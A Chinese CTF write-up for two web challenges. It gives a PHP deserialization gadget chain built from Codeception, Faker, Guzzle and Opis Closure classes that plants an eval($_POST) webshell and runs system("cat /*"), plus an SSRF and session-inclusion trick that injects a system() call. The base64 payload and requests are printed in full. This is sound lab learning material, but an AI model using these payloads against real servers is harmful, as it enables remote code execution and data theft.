# 前言

千言万语汇成一句：我真是太菜了。事实证明只会个php在卷成这样的ctf比赛里面只能挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打挨打。

不会Java和js直接下线，只能卑微的做最简单题。不说了，去补Java，js了。爬了。

# ezyii

直接从网上查

```php
<?php
namespace Codeception\Extension{
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess{
        protected $output;
        private $processes = [];
        public function __construct(){
            $this->processes[]=new DefaultGenerator(new AppendStream());
            $this->output=new DefaultGenerator('jiang');
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker{
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}
namespace GuzzleHttp\Psr7{
    use Faker\DefaultGenerator;
    final class AppendStream{
        private $streams = [];
        private $seekable = true;
        public function __construct(){
            $this->streams[]=new CachingStream();
        }
    }
    final class CachingStream{
        private $remoteStream;
        public function __construct(){
            $this->remoteStream=new DefaultGenerator(false);
            $this->stream=new  PumpStream();
        }
    }
    final class PumpStream{
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct(){
            $this->buffer=new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function(){eval($_POST[0]);};
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->source=$b;
        }
    }
}
```

```html
data=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6ImppYW5nIjt9czo0MzoiAENvZGVjZXB0aW9uXEV4dGVuc2lvblxSdW5Qcm9jZXNzAHByb2Nlc3NlcyI7YToxOntpOjA7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7TzoyODoiR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbSI6Mjp7czozNzoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac3RyZWFtcyI7YToxOntpOjA7TzoyOToiR3V6emxlSHR0cFxQc3I3XENhY2hpbmdTdHJlYW0iOjI6e3M6NDM6IgBHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbQByZW1vdGVTdHJlYW0iO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO2I6MDt9czo2OiJzdHJlYW0iO086MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjozOntzOjM0OiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac291cmNlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MTgzOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjI4OiJmdW5jdGlvbigpe2V2YWwoJF9QT1NUWzBdKTt9IjtzOjU6InNjb3BlIjtzOjI2OiJHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbSI7czo0OiJ0aGlzIjtOO3M6NDoic2VsZiI7czozMjoiMDAwMDAwMDAxYjMyNGRlNTAwMDAwMDAwMGY3MzRhNjkiO319czozMjoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAHNpemUiO2k6LTEwO3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbQBidWZmZXIiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6MToiaiI7fX19fXM6Mzg6IgBHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtAHNlZWthYmxlIjtiOjE7fX19fQ==&0=system("cat /*");
```





# 安全检测



随便登录后有个ssrf，过滤了很多东西，通过读`http://127.0.0.1/admin/`发现了`include123.php`，也是过滤了很多东西的文件包含。但是发现可以包含session，而且里面有user1,url1,url2等字段，猜测是post传的东西给了序列化，因此尝试session包含。

用2个session，第一次session传：

```html
url1=http://118.31.168.198:39601/1.txt#<?=system('sh /getfla?.sh');?>
```

第二个session通过ssrf+回显就可以得到内容了。

```html
http://127.0.0.1/admin/include123.php?u=/tmp/sess_19951cf47c9dd245c7b585593d7a9b35预览ver|s:1:"1";user1|s:5:"admin";url1|s:64:"http://118.31.168.198:39601/1.txt#flag{6c7ae4c6-de22-4449-99cf-4d7c9c5e1992}
flag{6c7ae4c6-de22-4449-99cf-4d7c9c5e1992}";html1|s:1:"1";url2|s:0:"";<code><span style="color: #000000">
<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code>
```

